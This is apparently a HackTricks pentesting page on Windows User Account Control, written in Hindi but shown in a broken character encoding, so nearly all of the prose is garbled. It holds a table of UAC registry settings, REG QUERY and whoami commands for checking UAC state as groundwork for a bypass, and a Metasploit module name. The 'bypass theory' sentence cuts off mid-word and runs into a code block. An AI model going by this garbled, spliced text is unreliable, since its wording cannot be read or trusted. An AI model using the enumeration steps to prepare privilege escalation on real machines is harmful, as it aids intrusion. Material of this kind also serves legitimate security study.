# UAC - рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рд╡рд░реНрдХрдлреНрд▓реЛ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВ**.\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[UAC (рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ **рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИ**. рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЗ рд╡рд┐рднрд┐рдиреНрди `integrity` рд╕реНрддрд░ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ рдПрдХ **рдЙрдЪреНрдЪ рд╕реНрддрд░** рд╡рд╛рд▓рд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдРрд╕реЗ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**. рдЬрдм UAC рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ, рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдФрд░ рдХрд╛рд░реНрдп рд╣рдореЗрд╢рд╛ **рдПрдХ рдЧреИрд░-рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддреЗ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдХреЗ рддрд╣рдд рдЪрд▓рддреЗ рд╣реИрдВ** рдЬрдм рддрдХ рдХрд┐ рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЗрди рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕/рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢рд╛рд╕рдХ-рд╕реНрддрд░реАрдп рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░рддрд╛. рдпрд╣ рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рд╕реЗ рдмрдЪрд╛рддреА рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕реАрдорд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ.

рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

рдЬрдм UAC рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ, рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ 2 рдЯреЛрдХрди рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреБрдВрдЬреА, рдирд┐рдпрдорд┐рдд рд╕реНрддрд░ рдкрд░ рдирд┐рдпрдорд┐рдд рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП, рдФрд░ рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде.

рдЗрд╕ [рдкреГрд╖реНрда](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рдкрд░ UAC рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЗрд╕рдХреА рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЪрд░реНрдЪрд╛ рдХреА рдЧрдИ рд╣реИ рдФрд░ рдЗрд╕рдореЗрдВ рд▓реЙрдЧрдСрди рдкреНрд░рдХреНрд░рд┐рдпрд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрднрд╡, рдФрд░ UAC рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ. рдкреНрд░рд╢рд╛рд╕рдХ рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрдерд╛рдиреАрдп рд╕реНрддрд░ рдкрд░ (secpol.msc рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) рдпрд╛ рдПрдХ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдбреЛрдореЗрди рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЧреНрд░реБрдк рдкреЙрд▓рд┐рд╕реА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ (GPO) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдФрд░ рдкреБрд╢ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ UAC рдХреЛ рдЕрдкрдиреЗ рд╕рдВрдЧрдарди рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢рд┐рд╖реНрдЯ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ. рд╡рд┐рднрд┐рдиреНрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреА рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдЪрд░реНрдЪрд╛ [рдпрд╣рд╛рдБ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) рдХреА рдЧрдИ рд╣реИ. UAC рдХреЗ рд▓рд┐рдП 10 рдЧреНрд░реБрдк рдкреЙрд▓рд┐рд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд╕реЗрдЯ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ. рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд╛рд▓рд┐рдХрд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд┐рд╡рд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ:

| рдЧреНрд░реБрдк рдкреЙрд▓рд┐рд╕реА рд╕реЗрдЯрд┐рдВрдЧ                                                                                                                                                                                                                                                                                                                                                           | рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА                | рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рдмрд┐рд▓реНрдЯ-рдЗрди рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рд▓рд┐рдП рдПрдбрдорд┐рди рдЕрдкреНрд░реВрд╡рд▓ рдореЛрдб](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: UIAccess рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рд╕рд┐рдХреНрдпреЛрд░ рдбреЗрд╕реНрдХрдЯреЙрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдПрд▓рд┐рд╡реЗрд╢рди рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рдПрдбрдорд┐рди рдЕрдкреНрд░реВрд╡рд▓ рдореЛрдб рдореЗрдВ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдПрд▓рд┐рд╡реЗрд╢рди рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд╛ рд╡реНрдпрд╡рд╣рд╛рд░](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | рдЧреИрд░-рд╡рд┐рдВрдбреЛрдЬ рдмрд╛рдЗрдирд░реАрдЬ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдореНрдкреНрдЯ                  |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрд▓рд┐рд╡реЗрд╢рди рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд╛ рд╡реНрдпрд╡рд╣рд╛рд░](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | рд╕рд┐рдХреНрдпреЛрд░ рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдореНрдкреНрдЯ                 |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрдВрд╕реНрдЯрд╛рд▓реЗрд╢рдиреНрд╕ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдФрд░ рдПрд▓рд┐рд╡реЗрд╢рди рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд░реЗрдВ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | рд╕рдХреНрд╖рдо (рдШрд░ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ) рдЕрдХреНрд╖рдо (рдЙрджреНрдпрдо рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ) |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рдХреЗрд╡рд▓ рдЙрди рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕ рдХреЛ рдПрд▓рд┐рд╡реЗрдЯ рдХрд░реЗрдВ рдЬреЛ рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░ рдорд╛рдиреНрдп рдХрд┐рдП рдЧрдП рд╣реИрдВ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рдХреЗрд╡рд▓ UIAccess рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рдПрд▓рд┐рд╡реЗрдЯ рдХрд░реЗрдВ рдЬреЛ рд╕рд┐рдХреНрдпреЛрд░ рд▓реЛрдХреЗрд╢рдиреНрд╕ рдореЗрдВ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдП рдЧрдП рд╣реИрдВ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | рд╕рдХреНрд╖рдо                                                      |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рд╕рднреА рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рдПрдбрдорд┐рди рдЕрдкреНрд░реВрд╡рд▓ рдореЛрдб рдореЗрдВ рдЪрд▓рд╛рдПрдВ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | рд╕рдХреНрд╖рдо                                                      |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рдПрд▓рд┐рд╡реЗрд╢рди рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд░рддреЗ рд╕рдордп рд╕рд┐рдХреНрдпреЛрд░ рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рд╕реНрд╡рд┐рдЪ рдХрд░реЗрдВ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | рд╕рдХреНрд╖рдо                                                      |
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рдлрд╛рдЗрд▓ рдФрд░ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд▓рд┐рдЦрдиреЗ рдХреА рд╡рд┐рдлрд▓рддрд╛рдУрдВ рдХреЛ рдкреНрд░рддрд┐-рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╡рд░реНрдЪреБрдЕрд▓рд╛рдЗрдЬрд╝ рдХрд░реЗрдВ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | рд╕рдХреНрд╖рдо                                                      |

### UAC рдмрд╛рдпрдкрд╛рд╕ рд╕рд┐рджреНрдзрд╛рдВрдд

рдХреБрдЫ рдкреНрд░реЛрдЧреНрд░рд╛рдореНрд╕ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдСрдЯреЛрдПрд▓рд┐рд╡реЗрдЯреЗрдб** рд╣реЛрддреЗ рд╣реИрдВ рдпрджрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдк
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
рдпрджрд┐ рдпрд╣ **`1`** рд╣реИ рддреЛ UAC **рд╕рдХреНрд░рд┐рдп** рд╣реИ, рдпрджрд┐ рдпрд╣ **`0`** рд╣реИ рдпрд╛ рдпрд╣ **рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**, рддреЛ UAC **рдирд┐рд╖реНрдХреНрд░рд┐рдп** рд╣реИред

рдлрд┐рд░, рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ **рдХреМрди рд╕рд╛ рд╕реНрддрд░** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* рдпрджрд┐ **`0`** рддреЛ, UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ (рдЬреИрд╕реЗ рдХрд┐ **рдирд┐рд╖реНрдХреНрд░рд┐рдп**)
* рдпрджрд┐ **`1`** рддреЛ рдПрдбрдорд┐рди рд╕реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдорд╛рдВрдЧрд╛ рдЬрд╛рдПрдЧрд╛** рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░)
* рдпрджрд┐ **`2`** (**рд╣рдореЗрд╢рд╛ рд╕реВрдЪрд┐рдд рдХрд░реЗрдВ**) UAC рд╣рдореЗрд╢рд╛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реЗ рдкреБрд╖реНрдЯрд┐ рдорд╛рдВрдЧреЗрдЧрд╛ рдЬрдм рд╡рд╣ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреБрдЫ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ (рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░)
* рдпрджрд┐ **`3`** `1` рдХреА рддрд░рд╣ рд▓реЗрдХрд┐рди рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ
* рдпрджрд┐ **`4`** `2` рдХреА рддрд░рд╣ рд▓реЗрдХрд┐рди рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ
* рдпрджрд┐ **`5`**(**рдбрд┐рдлрд╝реЙрд▓реНрдЯ**) рдпрд╣ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рд╕реЗ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЧреИрд░ Windows рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдкреБрд╖реНрдЯрд┐ рдорд╛рдВрдЧреЗрдЧрд╛

рдлрд┐рд░, рдЖрдкрдХреЛ **`LocalAccountTokenFilterPolicy`** рдХреЗ рдорд╛рди рдкрд░ рдзреНрдпрд╛рди рджреЗрдирд╛ рд╣реЛрдЧрд╛\
рдпрджрд┐ рдорд╛рди **`0`** рд╣реИ, рддреЛ, рдХреЗрд╡рд▓ **RID 500** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (**рдирд┐рд░реНрдорд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ**) рд╣реА **рдмрд┐рдирд╛ UAC рдХреЗ рдПрдбрдорд┐рди рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдФрд░ рдпрджрд┐ рдпрд╣ `1` рд╣реИ, рддреЛ **"рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ" рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдЦрд╛рддреЗ** рдЙрдиреНрд╣реЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдФрд░, рдЕрдВрдд рдореЗрдВ **`FilterAdministratorToken`** рдХреБрдВрдЬреА рдХреЗ рдорд╛рди рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓реЗрдВ\
рдпрджрд┐ **`0`**(рдбрд┐рдлрд╝реЙрд▓реНрдЯ), рддреЛ **рдирд┐рд░реНрдорд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддрд╛** рджреВрд░рд╕реНрде рдкреНрд░рд╢рд╛рд╕рди рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ **`1`** рддреЛ рдирд┐рд░реНрдорд┐рдд рдЦрд╛рддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ **рдирд╣реАрдВ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рджреВрд░рд╕реНрде рдкреНрд░рд╢рд╛рд╕рди рдХрд╛рд░реНрдп, рдЬрдм рддрдХ рдХрд┐ `LocalAccountTokenFilterPolicy` рдХреЛ `1` рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред

#### рд╕рд╛рд░рд╛рдВрд╢

* рдпрджрд┐ `EnableLUA=0` рдпрд╛ **рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**, рддреЛ **рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рднреА UAC рдирд╣реАрдВ**
* рдпрджрд┐ `EnableLua=1` рдФрд░ **`LocalAccountTokenFilterPolicy=1`, рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рднреА UAC рдирд╣реАрдВ**
* рдпрджрд┐ `EnableLua=1` рдФрд░ **`LocalAccountTokenFilterPolicy=0` рдФрд░ `FilterAdministratorToken=0`, RID 500 (рдирд┐рд░реНрдорд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ) рдХреЗ рд▓рд┐рдП UAC рдирд╣реАрдВ**
* рдпрджрд┐ `EnableLua=1` рдФрд░ **`LocalAccountTokenFilterPolicy=0` рдФрд░ `FilterAdministratorToken=1`, рд╕рднреА рдХреЗ рд▓рд┐рдП UAC**

рдЗрд╕ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **metasploit** рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХрддреНрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `post/windows/gather/win_privs`

рдЖрдк рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рдореВрд╣реЛрдВ рдХреА рднреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
net user %username%
whoami /groups | findstr Level
```
## UAC рдмрд╛рдпрдкрд╛рд╕

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХрд╛ рдЧреНрд░рд╛рдлрд┐рдХрд▓ рдПрдХреНрд╕реЗрд╕ рд╣реИ, рддреЛ UAC рдмрд╛рдпрдкрд╛рд╕ рд╕реАрдзрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк UAS рдкреНрд░реЙрдореНрдкреНрдЯ рджрд┐рдЦрд╛рдИ рджреЗрдиреЗ рдкрд░ рд╕рд┐рд░реНрдл "рд╣рд╛рдВ" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
{% endhint %}

